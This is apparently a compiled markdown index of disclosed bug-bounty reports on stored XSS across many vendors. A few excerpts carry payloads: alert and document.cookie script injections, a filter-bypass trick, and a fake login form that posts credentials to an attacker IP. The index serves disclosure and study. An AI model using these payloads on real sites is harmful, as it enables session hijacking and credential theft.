@@ -1,0 +1,336 @@
+# Cross-site Scripting (XSS) - Stored
+
+_166 reports — High/Critical, disclosed_
+
+- **[Variation of #3321406] YetAnother 1-Click Chaining of Self-XSS, Cookie Tossing and AntiCSRF Token Prediction leads to auto approval in AccessTempAuth** — `Cloudflare Public Bug Bounty` · `High` [↗](https://hackerone.com/reports/3423950)
+  - We have resolved an issue in Cloudflare Access where an exploit chain involving the Browser Isolation email field could allow for unauthorized approvals within the Temporary Auth workflow.
+- **Stored XSS in Conversion Statistics via Tracker Name** — `Revive Adserver` · `High` [↗](https://hackerone.com/reports/3400506)
+  - `CVE-2025-52668` I found stored XSS on the conversion statistics page.
+- **Stored XSS via LINK Name.** — `Insightly` · `High` [↗](https://hackerone.com/reports/1392262)
+  - The LINK NAME is not properly escaped at the Templates page leading to Stored XSS and the name is reflected in the <script> tag , due to lack of sanitization the user can break out of the <script> tag and execute the XSS.
+- **Stored XSS in AREA tutorials** — `Autodesk` · `High` [↗](https://hackerone.com/reports/3008066)
+  - A stored cross-site scripting (XSS) vulnerability was found on AREA, which could have allowed an attacker to inject malicious JavaScript code when publishing a tutorial.
+- **Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover** — `Dust` · `High` [↗](https://hackerone.com/reports/3115705)
+  - A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality.
+- **Stored Cross-Site Scripting in mercadopago.com.ar** — `MercadoLibre` · `High` [↗](https://hackerone.com/reports/1955485)
+  - We thank @elmago and @n1ko for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability.
+- **Stored XSS via Post Tittle Enabling Non-Privileged User to Privileged User Exploitation on https://forums.autodesk.com/** — `Autodesk` · `High` [↗](https://hackerone.com/reports/2974307)
+  - A stored cross-site scripting (XSS) vulnerability was found on Autodesk Forums, which could have allowed an attacker to inject malicious JavaScript code when viewed by both non-privileged and privileged users.
+- **Stored XSS on trix editor version 2.1.1** — `Basecamp` · `High` [↗](https://hackerone.com/reports/2521419)
+  - `CVE-2024-34341` The Trix editor is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor.
+- **Blind XSS on admin.acronis.com via delete account form on account.acronis.com** — `Acronis` · `High` [↗](https://hackerone.com/reports/666040)
+  - Blind XSS was possible on admin.acronis.com.
+- **Stored Xss On "https://www.question.com/"** — `Drugs.com` · `High` [↗](https://hackerone.com/reports/1901706)
+  - Hi Team I'm Find the Stored Xss On your Site Stored XSS, also known as persistent XSS, is the more damaging than non-persistent XSS.
+- **Stored XSS in reclamos** — `MercadoLibre` · `High` [↗](https://hackerone.com/reports/1675516)
+  - We thank @valent1ne for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability.
+- **Blind Stored XSS on the internal host - █████████████** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/923912)
+  - Hello. I often use mine xp.ht host as a beacon for SSRF/XSS payloads, and today one was triggered from the https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&& endpoint (it was found in the Referer header) This domain isn't res
+- **XSS via /api/v1/chat.postMessage ** — `Rocket.Chat` · `Critical` [↗](https://hackerone.com/reports/219957)
+  - **Summary:** An attacker can craft a custom message using the REST API that, once seen by the observer, executes arbitrary code in the context of the client user.
+- **XSS in various MessageTypes** — `Rocket.Chat` · `High` [↗](https://hackerone.com/reports/1379400)
+  - Rendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client.
+- **Multiple XSS and open HTTP redirection** — `ExpressionEngine` · `High` [↗](https://hackerone.com/reports/2372332)
+  - ExpressionEngine was affected by multiple cross-site scripting vulnerabilities that could allow an attacker to execute JavaScript in the browsers of targeted users.
+- **Stored-XSS injected in Wiki page via Banzai pipeline** — `GitLab` · `High` [↗](https://hackerone.com/reports/2257080)
+  - I found a vulnerability in [AbstractReferenceFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb) class that can be exploited to inject any HTML elements leading to stored-XSS.
+- **Stored XSS on LinkedIn App via iframe tag in Article** — `LinkedIn` · `Critical` [↗](https://hackerone.com/reports/2212950)
+  - A stored XSS issue was reported on “LinkedIn Article” where a malicious JavaScript (JS) payload can be embedded in URL field of iframe.
+- **Client Side Template Injection to Stored XSS in Image Collection** — `Mars` · `High` [↗](https://hackerone.com/reports/2234564)
+  - Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages.
+- **Stored xss at https://█.8x8.com/api/█/ID** — `8x8` · `High` [↗](https://hackerone.com/reports/2078490)
+  - hey , i found a stored xss at https://██████.8x8.com/api/██████mentInfoById/ID , when i analysis javascript code i understand user can modify her ip address with endpoint https://███.8x8.com/api/patchPaymentMethod/ID , next point i understand when we open https://███████
+- **XSS with Visual Language Editor tags** — `Invision Power Services, Inc.` · `High` [↗](https://hackerone.com/reports/2031855)
+  - **Note**: This is not very uncommon, as one could simply suggest an administrator to change wording of a language phrase, or correct a translation in an area where user-generated content (such as comments) is displayed.
+- **MetaMask Browser URL and Transaction Origin Spoofing - Metamask wallet Android & Metamask wallet iOS** — `MetaMask` · `High` [↗](https://hackerone.com/reports/1751333)
+  - @renekroka and @hackerontwowheels from the talented team at [UGWST](https://ugwst.com/) discovered a bug that prevented the MetaMask Mobile browser from correctly updating the domain of the browser tab after a redirect.
+- **Universal XSS with Playlist feature** — `Brave Software` · `High` [↗](https://hackerone.com/reports/1436558)
+  - Brave iOS has three weaknesses described below.
+- **Stored XSS via Kroki diagram** — `GitLab` · `High` [↗](https://hackerone.com/reports/1731349)
+  - If Kroki has been enabled, it's possible to craft a pre block so that arbitrary attributes can be injected into the resulting img tag.
+- **Stored XSS in merge request pages** — `GitLab` · `High` [↗](https://hackerone.com/reports/723307)
+  - [Vulnerable code](https://gitlab.com/gitlab-org/gitlab/blob/9d81e97d9d111f874799605ce50ae480ae15b0c5/app/assets/javascripts/vue_merge_request_widget/components/states/mr_widget_rebase.vue#L47) To reproduce the bug, we need to open a merge request with the following conditions:
+- **RichText parser vulnerability in scheduled posts allows XSS** — `Reddit` · `High` [↗](https://hackerone.com/reports/1930763)
+  - RichText parser is not filtering links when editing scheduled posts 4.
+- **Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)** — `Expedia Group Bug Bounty` · `High` [↗](https://hackerone.com/reports/1760213)
+  - Report #1698316 was closed as resolved You told me that the stored XSS was going to be resolved since "As this relies on the same root cause, we will be closing it as duplicate", but no
+- **Stored-XSS with CSP-bypass via labels' color** — `GitLab` · `High` [↗](https://hackerone.com/reports/1665658)
+  - Gitlab allows to import a project from Github.
+- **Bypass: Stored-XSS with CSP-bypass via scoped labels' color** — `GitLab` · `High` [↗](https://hackerone.com/reports/1693150)
+  - The [Stored-XSS with CSP-bypass via labels' color](https://hackerone.com/reports/1665658) has been mitigated in [Gitlab 15.3.2](https://about.gitlab.com/releases/2022/08/30/critical-security-release-gitlab-15-3-2-released/#stored-xss-via-labels-color).
+- **Cross-site scripting on algorithm collaborator ** — `Quantopian` · `High` [↗](https://hackerone.com/reports/615672)
+  - Hi again my favorite VDP team.
+- **New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields** — `GitLab` · `High` [↗](https://hackerone.com/reports/1578400)
+  - `CVE-2022-1948` In Gitlab 15.0.0 a new Customer Relations feature was added that allows us to use quick actions to find the contact we wish to select.
+- **XSS in SocialIcon Link** — `Linktree` · `High` [↗](https://hackerone.com/reports/1698652)
+  - There was no validation of the url provided for the SocialIcon Link , which allowed to include javascript uri .
+- **Persistent CSS injection with ’marked’ markdown parser in Rocket.Chat** — `Rocket.Chat` · `High` [↗](https://hackerone.com/reports/1401268)
+  - `CVE-2022-35251` **Summary:** Rocket.Chat offers two different markdown parsers out of the box: the ’orginal’ one and the ’marked’ one.
+- **STORED XSS in █████████/nlc/login.aspx via "edit" GET parameter through markdown editor [HtUS]** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/1631447)
+  - While looking through the source code of https://████████/nlc/login.aspx,I noticed this line (204): <a id="ctl00_ContentPlaceHolder1_CancelButton" class="hidden" href="login.aspx?edit=false"><i class="fa fa-times"></i> Cancel</a> ,which exposes the **edit** GET parameter.
+- **Stored XSS at https://█████** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/1620247)
+  - In registeration page ( https://████ ) , first name and last name field are vulnerable to Stored Cross Site Scripting.
+- **Stored XSS for Grafana dashboard URL** — `GitLab` · `High` [↗](https://hackerone.com/reports/684268)
+  - I found a stored XSS vulnerability in the admins page.
+- **Stored XSS on issue comments and other pages which contain notes** — `GitLab` · `High` [↗](https://hackerone.com/reports/1398305)
+  - This report contains two XSS sanitization bypasses: def highlight_node(node) ...
+- **Stored XSS in Notes (with CSP bypass for gitlab.com)** — `GitLab` · `High` [↗](https://hackerone.com/reports/1481207)
+  - I read the issue [345657](https://gitlab.com/gitlab-org/gitlab/-/issues/345657) which handles the XSS in notes reported in Hackerone report [1398305](https://hackerone.com/reports/1398305).
+- **Cross-site scripting on dashboard2.omise.co** — `Omise` · `Critical` [↗](https://hackerone.com/reports/1532858)
+  - Cross-site scripting (XSS) is an attack vector that injects malicious code into a vulnerable web application.
+- **Stored XSS in photos_user_map.gne** — `Flickr` · `High` [↗](https://hackerone.com/reports/1534636)
+  - The Flickr map page was inadequately escaping the name of groups when browsing the map of a group's photos.
+- **Blind XSS via Feedback form.** — `Judge.me` · `High` [↗](https://hackerone.com/reports/1339034)
+  - I found Blind XSS which is triggered on the admin panel.
+- **Stored XSS in merge request creation page through payload in approval rule name** — `GitLab` · `High` [↗](https://hackerone.com/reports/1342009)
+  - Hi GitLab team, I found a stored XSS in merge request creation page caused by a payload in the name of an "approval rule".
+- **Stored XSS through PDF viewer** — `Slack` · `High` [↗](https://hackerone.com/reports/881557)
+  - Slack allows users to upload files to their Workspace to facilitate sharing information between team members as well as with other workspaces.
+- **XSS via Mod Log Removed Posts** — `Reddit` · `High` [↗](https://hackerone.com/reports/1504410)
+  - I have discovered an XSS vulnerability regarding the mod notes feature.
+- **Blind XSS on Twitter's internal Jira panel at ████ allows exfiltration of hackers reports and other sensitive data** — `X / xAI` · `Critical` [↗](https://hackerone.com/reports/1369674)
+  - The researcher demonstrated a vulnerability in Twitter's Jira instance where user supplied information was handled in an improper manner, rendering the application vulnerable to blind XSS.
+- **SSRF & Blind XSS in Gravatar email ** — `Automattic` · `High` [↗](https://hackerone.com/reports/1100096)
+  - Nathan Cavitt (rockybandana) reported a blind XSS issue in the Gravatar service, which was due to incorrect/insufficient sanitization on adding emails to one's profile.
+- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `GitLab` · `High` [↗](https://hackerone.com/reports/1280002)
+  - I am continue investigating #1106238 and found additional vector for prototype pollution and stored xss.
+- **Stored XSS вирус в al_video.php?act=a_choose_video_box** — `VK.com` · `High` [↗](https://hackerone.com/reports/670509)
+  - —
+- **Stored XSS в m.vk.com/video** — `VK.com` · `High` [↗](https://hackerone.com/reports/730963)
+  - —
+- **Stored XSS in markdown via the DesignReferenceFilter ** — `GitLab` · `Critical` [↗](https://hackerone.com/reports/1212067)
+  - When rendering markdown, links to designs are parsed using the following link_reference_pattern: def self.link_reference_pattern @link_reference_pattern //= begin path_segment = %r{issues/#{Gitlab::Regex.issue}/designs} ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_I
+- **Stored XSS in main page of a project caused by arbitrary script payload in group "Default initial branch name"** — `GitLab` · `High` [↗](https://hackerone.com/reports/1256777)
+  - A stored XXS exists in the main page of a project.
+- **[Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`** — `Elastic` · `High` [↗](https://hackerone.com/reports/1245787)
+  - I have found a stored XSS when create a document via API-based engine.
+- **Improper Sanitization leads to XSS Fire on admin panel** — `Informatica` · `High` [↗](https://hackerone.com/reports/1011888)
+  - Because the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html, the input is vulnerable to XSS.
+- **Blind Stored XSS in https://partners.acronis.com/admin which lead to sensitive information/PII leakage** — `Acronis` · `High` [↗](https://hackerone.com/reports/1028820)
+  - Blind XSS was possible on partners.acronis.com (Tier 3) via several contact form fields.
+- **Stored XSS in custom emoji** — `GitLab` · `High` [↗](https://hackerone.com/reports/1198517)
+  - I found Stored XSS with a feature of custom emoji.
+- **Stored-XSS in merge requests** — `GitLab` · `High` [↗](https://hackerone.com/reports/977697)
+  - A stored XSS is existing in the merge requests pages.
+- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `GitLab` · `High` [↗](https://hackerone.com/reports/1106238)
+  - Gitlab supports Mermaid as part of GFM to allow users to generate diagrams and flowcharts from text.
+- **Stored DOM XSS via Mermaid chart** — `GitLab` · `High` [↗](https://hackerone.com/reports/1103258)
+  - Gitlab supports Mermaid as part of GFM to allow users to generate diagrams and flowcharts from text.
+- **Blind XSS on Twitter's internal Big Data panel at █████████████** — `X / xAI` · `Critical` [↗](https://hackerone.com/reports/1207040)
+  - An attacker appears to be able to send an XSS payload to Twitter staff members, using a Support Form.
+- **Post-Auth Stored XSS with User Interaction leads to Remote Code Execution** — `Rocket.Chat` · `High` [↗](https://hackerone.com/reports/1132202)
+  - Unsafe usage of the toastr library leads to Stored XSS when combined with a validation bypass in the createRoom function.
+- **Account takeover via XSS** — `Rocket.Chat` · `Critical` [↗](https://hackerone.com/reports/735638)
+  - **Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.
+- **Blind Stored XSS Payload fired at the backend on https://█████████/** — `U.S. Dept Of Defense` · `Critical` [↗](https://hackerone.com/reports/1051369)
+  - I have just gotten an email notification from my XSSHunter payload that my blind stored XSS has been triggered by an administrator on the █████████ site, in the following URL: Admin IP address: ████████
+- **Blind Stored XSS on https://█████████ after filling a request at https://█████** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/1017189)
+  - When you submit a request at https://██████████, the content is being sent to the administrators of the application, and you will be presented with your request status at https://████ The Description field at the request status page is prone to stored xss and blind stored XSS inj
+- **Stored XSS through name / last name on https://██████████/** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/1072616)
+  - There is stored XSS Vulnerability on https://█████/██████ by rendering unsafe input being registered on the account name and last name.
+- **Blind Stored XSS on ███████  leads to takeover admin account** — `U.S. Dept Of Defense` · `Critical` [↗](https://hackerone.com/reports/1110243)
+  - I am Hemant Patidar working as a security researcher and I found a bug in your site.
+- **[First 30] Stored XSS on login.uber.com/oauth/v2/authorize via redirect_uri parameter** — `Uber` · `High` [↗](https://hackerone.com/reports/392106)
+  - Stored XSS execution at https://login.uber.com due to unsanitized user-supplied input passed through Privacy Policy URL.
+- **[manage.jumpbikes.com] Blind XSS on Jump admin panel via user name** — `Uber` · `Critical` [↗](https://hackerone.com/reports/472470)
+  - By setting a user's name to an XSS payload, a user was able to inject JavaScript which was executed on the administrative panel for Jump bikes, allowing complete compromise of the panel, exposing user activity, personal information and billing information.
+- **Stored XSS in wordpress.com** — `Automattic` · `High` [↗](https://hackerone.com/reports/1054526)
+  - Hello Team, I found the Stored XSS vulnerability in the Custom Style section, this vulnerability can result in an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user.
+- **Stored XSS in Intense Debate comment system** — `Automattic` · `High` [↗](https://hackerone.com/reports/1039750)
+  - The Intense Debate comment system is vulnerable to stored xss by users , this would allow for atacking admins/users on the blog , ________________________________________________________________________________________ ____________________________________________________________
+- **Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/847176)
+  - A user is able to complete a ████████ worksheets via https://██████████.
+- **Stored XSS at https://www.█████████.mil** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/1081994)
+  - Stored XSS exists at https://www.██████.mil.
+- **Blind stored XSS due to insecure contact form at https://█████.mil leads to leakage of session token and ** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/1036877)
+  - I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://███████.mil/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.
+- **XSS in message attachment fileds.** — `Rocket.Chat` · `Critical` [↗](https://hackerone.com/reports/899954)
+  - `CVE-2020-8288` **Summary:** There is a Cross-Site Scripting vulnerability in the message attachment fields.
+- **Stored XSS on the job page** — `GitLab` · `High` [↗](https://hackerone.com/reports/856554)
+  - API URL: https://google.com 5.
+- **Blind XSS on image upload** — `CS Money` · `Critical` [↗](https://hackerone.com/reports/1010466)
+  - Allows the hacker to execute javascript.
+- **Store-XSS in error message of build-dependencies ** — `GitLab` · `High` [↗](https://hackerone.com/reports/950190)
+  - `CVE-2020-13340` A stored-XSS is existing in error message of build-dependencies.
+- **Stored XSS on https://app.crowdsignal.com/surveys/[Survey-Id]/question - Bypass** — `Automattic` · `High` [↗](https://hackerone.com/reports/974271)
+  - Hello there, I hope all is well!
+- **HEY.com email stored XSS** — `Basecamp` · `Critical` [↗](https://hackerone.com/reports/982291)
+  - An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.
+- **Stored XSS via Comment Form at ████████** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/915073)
+  - An attacker can submit a comment form with injected HTML, leading to a number of malicious effects For credential theft, an attacker could place <h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><
+- **Stored-Xss at connect.topcoder.com/projects/ affected on project chat members** — `Lab45` · `High` [↗](https://hackerone.com/reports/779908)
+  - Hi team , I'm sorry for my bad report and english , but i wish you understand the impact of that bug here , if it well performed the sers may lose their access to their sso accounts While a developer at connect.topcoder.com can manage a messages about his/her project with someone
+- **Stored XSS in markdown when redacting references** — `GitLab` · `High` [↗](https://hackerone.com/reports/836649)
+  - It's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter.
+- **Stored XSS in "Create Groups"** — `GitLab` · `High` [↗](https://hackerone.com/reports/647130)
+  - Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc.
+- **Blind Stored XSS Via Staff Name** — `Shopify` · `High` [↗](https://hackerone.com/reports/948929)
+  - Hey Team, I found blind stored XSS when i add staff name in https://your-store.myshopify.com/admin/settings/account 4.
+- **pre-auth Stored XSS in comments via javascript: url when administrator edits user supplied comment** — `WordPress` · `High` [↗](https://hackerone.com/reports/633231)
+  - When a comment is submitted, it is filtered via wp_rel_nofollow_callback(), which adds the rel attribute to <a> tags within the anchor: function wp_rel_nofollow_callback( $matches ) { $text = $matches[1]; $atts = shortcode_parse_atts( $matches[1] ); $rel = 'nofollow';
+- **Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII** — `Lab45` · `High` [↗](https://hackerone.com/reports/878145)
+  - I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle
+- **Stored XSS in my staff name fired in another your internal panel** — `Shopify` · `High` [↗](https://hackerone.com/reports/946053)
+  - I had lots of tests for bug bounty in my test store "trstore-3.myshopify.com" (created about 4 years ago) and then one of your developers noticed that a stored cross-site scripting payload in my staff name fired in another your internal panel.
+- **Stored XSS in TSVB Visualizations Markdown Panel** — `Elastic` · `High` [↗](https://hackerone.com/reports/858874)
+  - **Summary:** An authenticated user can save a TSVB visualization, which contains a stored cross-site scripting (XSS) payload in the included Less code as part of the markdown panel.
+- **Stored XSS in Elastic App Search** — `Elastic` · `High` [↗](https://hackerone.com/reports/846905)
+  - There exists a stored XSS via reference_ui in "URL" Parameter in the latest Elastic App Search v7.6.2 (Tested both on cloud and local instance) Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message foru
+- **Stored Cross Site Scripting.** — `8x8` · `High` [↗](https://hackerone.com/reports/413077)
+  - Hellow team I got Stored based XSS on your web :D So Enter your full name like : "><script>alert(1)</script> Then put all the other details.
+- **Stored XSS at ██████userprofile.aspx** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/901377)
+  - Stored XSS vulnerability exists at ██████████userprofile.aspx under "say something about yourself...".
+- **Stored XSS agent_status ** — `8x8` · `High` [↗](https://hackerone.com/reports/418271)
+  - The functionality to set a user's status within the ContactNow application did not perform sufficient encoding when displayed to other user's of a given organization.
+- **Unrestricted file upload leads to stored xss on https://████████/** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/854445)
+  - When the user want to upload a "certificate", the web app doesn't check the content-type of the file.
+- **Stored Xss Vulnerability on ████████** — `U.S. Dept Of Defense` · `High` [↗](https://hackerone.com/reports/380103)
+  - A Xss vulnerability using svg file & html file.
+- **Stored XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action** — `Lab45` · `High` [↗](https://hackerone.com/reports/866815)
+  - Hi :) Adding javascript url causes to stored XSS when creating bookmark.
+- **Stored XSS on https://apps.topcoder.com/wiki/pages/editpage.action** — `Lab45` · `High` [↗](https://hackerone.com/reports/867133)
+  - Hi :) There is a stored XSS on wiki pages and it executes when editing page.
+- **Stored XSS on upload files leads to steal cookie** — `Palo Alto Software` · `High` [↗](https://hackerone.com/reports/765679)
+  - There isn't a check mechanism on file format in Inbox which an attacker can send an SVG file as other formats such as png, gif or bmp by rename and change file format leads XSS attack and steal victim cookies.
+- **Stored XSS in wordpress.com** — `Automattic` · `High` [↗](https://hackerone.com/reports/733248)
+  - Stored XSS as a comment or as a post (body or title) at https://wordpress.com/read/feeds/{blog_id}/posts/{post_id} https://yoursubdomain.wordpress.com using the payload: <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt; 4.
+- **[file-browser] Inadequate Output Encoding and Escaping ** — `Node.js third-party modules` · `High` [↗](https://hackerone.com/reports/507303)
+  - I would like to report stored xss in file-browser module It allows an attacker to embed malicious js code as filenames,which get executed once browsed to the file over the web browser **module name:** file-browser **version:** 0.0.5 **npm page:** https://www.npmjs.com/package/fil
+- **Хранимый XSS в Business-аккаунте, на странице компании** — `DRIVE.NET, Inc.` · `High` [↗](https://hackerone.com/reports/771882)
+  - Приложение уязвимо к атакам Типа "Межсайтовое выполнение сценариев".
+- **Potential unprivileged Stored XSS through wp_targeted_link_rel** — `WordPress` · `High` [↗](https://hackerone.com/reports/509930)
+  - `CVE-2019-16773` The user description is vulnerable to a Stored XSS via an attribute injection.
+- **[fileview] Inadequate Output Encoding and Escaping ** — `Node.js third-party modules` · `High` [↗](https://hackerone.com/reports/507159)
+  - `CVE-2019-15602` I would like to report stored xss in fileview module It allows an attacker to embed malicious js code in filename there was no sanitization performed.
+- **Stored XSS on Wordpress 5.3 via Title Post** — `WordPress` · `High` [↗](https://hackerone.com/reports/754352)
+  - I have identified a WordPress security vulnerability , a Stored XSS vulnerability that affects latest version of WordPress (5.3) POC: 1) Login to wordpress website 2) Make a post with title payload xss like example <script>alert(document.domain);</script> 3) Publish then open the
+- **Account takeover through the combination of cookie manipulation and XSS** — `Superhuman (formerly Grammarly)` · `High` [↗](https://hackerone.com/reports/534450)
+  - **Summary:** A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization.
+- **stored xss in https://www.smule.com** — `Smule` · `High` [↗](https://hackerone.com/reports/733222)
+  - hi team , I found a stored xss in www.smule.com **Summary:** [add summary of the vulnerability]
+- **Stored Self XSS on https://app.crowdsignal.com (in Photo Insert App) + Stored XSS on https://*your-subdomain*.survey.fm** — `Automattic` · `High` [↗](https://hackerone.com/reports/667188)
+  - Now you will see xss (poc2.png).
+- **The return of the ＜** — `Rockstar Games` · `High` [↗](https://hackerone.com/reports/639684)
+  - In this report, the researcher was able to demonstrate a Stored XSS vulnerability in our Message system on the Social Club website.
+- **Stored XSS in Wiki pages** — `GitLab` · `High` [↗](https://hackerone.com/reports/526325)
+  - `CVE-2019-5467` I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages.
+- **[okmedia.insideok.ru] Web Cache Poisoing & XSS** — `ok.ru` · `High` [↗](https://hackerone.com/reports/550266)
+  - XSS and Web Cache Poisoning at *.insideok.ru via X-Forwarded-Host header Web Cache Poisoing & XSS okmedia.insideok.ru
+- **Persistent XSS in Note objects** — `GitLab` · `High` [↗](https://hackerone.com/reports/508184)
+  - Some cache invalidation and project import logic issues enable an attacker to import a project with XSS payloads in places like MR discussions and similar places where a Note object exists.
+- **Stored XSS Vulnerability** — `WordPress` · `High` [↗](https://hackerone.com/reports/643908)
+  - Hi there, I found a stored xss @ https://core.trac.wordpress.org/ 4.
+- **Stored XSS in infogram.com via language ** — `Infogram` · `High` [↗](https://hackerone.com/reports/430029)
+  - The stored XSS was found in the language profile parameter.
+- **Ability to create own account UUID leads to stored XSS** — `Upserve` · `High` [↗](https://hackerone.com/reports/249131)
+  - I found an interesting bug where the system allows a user to create their own UUIDs.
+- **WooCommerce: Persistent XSS via customer address (state/county)** — `Automattic` · `High` [↗](https://hackerone.com/reports/530499)
+  - Persistent XSS via customer address (state/county) ================================ High 7.2 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N)
+- **Stored xss in address field in billing activity at https://shop.aaf.com/Order/step1/index.cfm** — `Alliance of American Football` · `High` [↗](https://hackerone.com/reports/411690)
+  - **Summary:** [add summary of the vulnerability] After looking into https://shop.aaf.com/Order/step1/index.cfm i get to know that there is address field is vulnerable to stored xss which can lead to steal any user's cookie and can lead to complete account takeover **Description:**
+- **Multiple XSS on account settings that can hijack any users in the company. ** — `X / xAI` · `Critical` [↗](https://hackerone.com/reports/503298)
+  - Hello Twitter Team, I just noticed that my report #485748 is already fixed, can you confirm?
+- **Stored XSS on reports.** — `X / xAI` · `High` [↗](https://hackerone.com/reports/485748)
+  - Stored XSS can be submitted on reports, and anyone who will check the report the XSS will trigger.
+- **Stored XSS in Private Message component (BuddyPress)** — `WordPress` · `Critical` [↗](https://hackerone.com/reports/487081)
+  - WordPress version: **5.0.3** BuddyPress version: **4.1.0** Users with accounts can send private messages containing rendered HTML to other uses, this includes being able to execute javascript code via elements such as scripts, iframe etc.
+- **XSS in steam react chat client** — `Valve` · `Critical` [↗](https://hackerone.com/reports/409850)
+  - The Steam chat client both sends and receives bbcode format chat messages.
+- **Bypass Filter and get Stored Xss ** — `Shopify` · `High` [↗](https://hackerone.com/reports/299424)
+  - Shopify allows developers to create a special type of application called a "Sales Channel".
+- **Stored XSS in merge request pages** — `GitLab` · `High` [↗](https://hackerone.com/reports/409380)
+  - I found a Stored XSS in merge request pages.
+- **Stored XSS on any page in most Uber domains** — `Uber` · `High` [↗](https://hackerone.com/reports/217739)
+  - Due to two IDOR vulnerabilities in Tealium, it was possible to compromise an administrator’s account and inject arbitrary Javascript into https://tags.tiqcdn.com/utag/uber/*, which an attacker could leverage for a stored XSS attack on several Uber domains.
+- **Web Cache Deception Attack (XSS)** — `Discourse` · `High` [↗](https://hackerone.com/reports/394016)
+  - This XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested.
+- **Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains** — `Uber` · `High` [↗](https://hackerone.com/reports/256152)
+  - When creating new tags on Tealium, the application did not check that the user creating the tag had authorized as the same account they were creating a tag for.
+- **Stored xss** — `Shopify` · `High` [↗](https://hackerone.com/reports/415484)
+  - WAF cut html tages but when put <!--> before tages we can bypass it :) .
+- **stored XSS (angular injection) in support.rockstargames.com using zendesk register form via name parameter** — `Rockstar Games` · `High` [↗](https://hackerone.com/reports/354262)
+  - In this report, the researcher discovered that registering for our Support site using the Zendesk Registration Form allowed for entering an AngularJS Template Injection payload as the Username.
+- **Passive stored XSS at broadcast room** — `Chaturbate` · `High` [↗](https://hackerone.com/reports/423797)
+  - The hacker found that a specially crafted app names could insert a small amount of data into an A tag's href in the "Broadcaster is running these apps: " chat text.
+- **Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS** — `GSA Bounty` · `High` [↗](https://hackerone.com/reports/303730)
+  - An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.
+- **Stored XSS on Issue details page** — `GitLab` · `High` [↗](https://hackerone.com/reports/384255)
+  - The detail page of Issue (the page that provides the content of an Issue) is vulnerable to Stored XSS.
+- **Stored xss in shop name @ lp.reverb.com** — `Reverb.com` · `High` [↗](https://hackerone.com/reports/329862)
+  - There is a stored xss in lp.reverb.com.
+- **Stored XSS on activity** — `Shopify` · `High` [↗](https://hackerone.com/reports/391390)
+  - Hi security team members, I found a store xss on the activity which allows an attacker to steal admin account cookies.
+- **XSS-уязвимость, связанная с загрузкой файлов** — `VK.com` · `Critical` [↗](https://hackerone.com/reports/375886)
+  - —
+- **stored xss in scrape-metadata when reading metadata from an html page** — `Node.js third-party modules` · `High` [↗](https://hackerone.com/reports/369573)
+  - scrape-metadata https://www.npmjs.com/package/scrape-metadata a module used to scrape meta data contents from an article
+- **Stored XSS in Node-Red** — `Node.js third-party modules` · `High` [↗](https://hackerone.com/reports/349146)
+  - I would like to report a stored XSS in node-red It allows to execute javascript in the user's browser **module name:** node-red **version:** v0.18.4 **npm page:** https://www.npmjs.com/package/node-red
+- **XSS (Persistent) - Selecting role(s) for protected branches** — `GitLab` · `High` [↗](https://hackerone.com/reports/346111)
